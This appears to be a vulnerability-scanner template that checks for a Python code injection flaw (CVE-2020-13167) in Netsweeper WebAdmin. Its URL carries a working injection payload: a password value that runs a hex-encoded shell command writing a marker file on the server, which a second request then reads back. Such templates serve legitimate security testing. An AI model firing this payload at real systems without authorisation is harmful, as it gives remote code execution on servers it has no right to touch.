id: cve-2020-13167
info:
  name: Netsweeper WebAdmin Python Code Injection
  risk: High

params:
  - root: '{{.BaseURL}}'
  
variables:
  - endpoint: |
      webadmin/
requests: 
  - method: GET
    url: >-
      {{.root}}/{{.endpoint}}tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
      {{.root}}/{{.endpoint}}out
    headers:
      - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
      - Referer: "{{.root}}/webadmin/admin/service_manager_data.php"
    detections:
      - >-
        StatusCode() == 200 && StringSearch("resBody", "nonexistent")

references:
  - https://www.cvebase.com/cve/2020/13167
